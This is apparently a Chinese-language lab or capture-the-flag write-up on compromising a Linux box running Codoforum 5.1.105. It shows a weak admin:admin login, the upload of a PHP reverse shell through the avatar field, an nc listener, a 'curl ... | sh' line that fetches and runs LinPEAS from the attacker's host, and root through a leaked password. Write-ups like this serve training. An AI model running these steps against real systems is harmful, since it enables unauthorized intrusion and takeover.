---
description: Linux - Easy：CODOFORM V.5.1.105
---

# ✔️ Codo

## 建立立足点

### 信息枚举

使用Nmap对目标系统进行开放端口扫描，获得2个端口：22和80

```bash
nmap -sC -sV -p- -oA codo 192.168.200.23 --open  
```

<figure><img src="../../.gitbook/assets/1 (16).png" alt=""><figcaption></figcaption></figure>

检查80端口上的Web页面：

<figure><img src="../../.gitbook/assets/2 (18).png" alt=""><figcaption></figcaption></figure>

尝试枚举80端口上的隐藏文件/目录，并&#x5728;**/admin**路径上发现登录界面：

```bash
dirsearch -u http://192.168.200.23
```

<figure><img src="../../.gitbook/assets/3 (13).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/4 (16).png" alt=""><figcaption></figcaption></figure>

尝试用弱口令<mark style="color:red;">**admin:admin**</mark>登录成功：

<figure><img src="../../.gitbook/assets/5 (17).png" alt=""><figcaption></figcaption></figure>

并且发现目标正在使用的是：CODOFORM V.5.1.105

<figure><img src="../../.gitbook/assets/6 (16).png" alt=""><figcaption></figcaption></figure>

### 漏洞查阅

查找相关漏洞发现其有一个远程命令执行的漏洞可以利用：

```bash
searchsploit codoforum 5.1
searchsploit -m 50978.py .
```

<figure><img src="../../.gitbook/assets/7 (15).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/8 (13).png" alt=""><figcaption></figcaption></figure>

### 漏洞利用

根据该脚本的使用方法所构造的命令确认无误后，发现始终无法利用成功。但仍然从该脚本中获取到了重要的信息：**可在admin设置中上传脚本**

<figure><img src="../../.gitbook/assets/9 (13).png" alt=""><figcaption></figcaption></figure>

决定直接在admin后台中上传反弹shell来get shell。

* 先在全局设置中的可上传文件类型中**添加.php**，以方便后续上传**php-reverse-shell.php脚本**

<figure><img src="../../.gitbook/assets/10 (15).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/11 (14).png" alt=""><figcaption></figcaption></figure>

* 然后准备好php-reverse-shell.php脚本，修改好反弹shell监听的主机IP和端口号，并在Kali本机监听好端口：

```bash
// Kali本机监听
nc -lvnp 1234
```

<figure><img src="../../.gitbook/assets/12 (14).png" alt=""><figcaption></figcaption></figure>

* 在用户->管理用户->admin的设置页面中，找到头像上传项，并将准备好的反弹shell脚本上传后，点save键触发脚本：

<figure><img src="../../.gitbook/assets/13 (13).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/14 (14).png" alt=""><figcaption></figcaption></figure>

### GET SHELL

成功获得反弹shell，并获得local.txt：

<figure><img src="../../.gitbook/assets/15 (13).png" alt=""><figcaption></figcaption></figure>

## 权限提升

### 本地信息枚举

上传LinPEAS.sh脚本，对目标进行本地信息收集，已发现可利用的提权漏洞：

```bash
// Kali本机准备好linpeas.sh脚本，并在所属目录下开启服务器
python3 -m http.server
// 在目标系统中，下载linpeas.sh到本地并且直接执行
curl -L 192.168.45.172:8000/linpeas.sh |sh
```

<figure><img src="../../.gitbook/assets/16 (14).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/17 (14).png" alt=""><figcaption></figcaption></figure>

### 漏洞利用

阅读linpeas.sh脚本的输出结果后，发现一个密码：<mark style="color:red;">**FatPanda123**</mark>

<figure><img src="../../.gitbook/assets/18 (13).png" alt=""><figcaption></figcaption></figure>

并且已知当前系统上有两个用户账户：offsec和root，分别尝试后发现它是root账户的密码。

### ROOT

<figure><img src="../../.gitbook/assets/19 (13).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/20 (9).png" alt=""><figcaption></figcaption></figure>
